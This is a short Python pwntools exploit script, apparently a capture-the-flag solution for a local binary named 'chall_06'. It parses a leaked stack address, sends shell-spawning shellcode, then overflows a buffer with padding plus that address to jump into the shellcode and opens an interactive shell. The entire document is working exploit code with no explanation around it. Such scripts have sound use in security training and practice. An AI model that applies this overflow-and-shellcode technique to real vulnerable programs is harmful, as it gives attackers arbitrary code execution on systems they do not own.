from pwn import *

#Matt Gwin

context.arch = 'amd64'

def get_leak(response):
	#leak = response[::-1]
	init = response.index(b"0x")
	end = len(response) - 1 # accounting for the newline
	leak = response[init:end]
	print(leak)
	return int(leak, 16)

p = process("./chall_06")
resp = p.recv()
l = get_leak(resp)
sc = shellcraft.sh()
#Send shellcode into the variable at adress leak
asc = asm(sc)
#payload1 = b"A" * (0x60) + p64(l)
#p.sendline(payload1)
p.sendline(asc)
#p.recv()
#send address we will jump to into location of 
payload = b"A" * (0x60 - 0x8) + p64(l)
print(payload)

p.sendline(payload)
p.interactive()
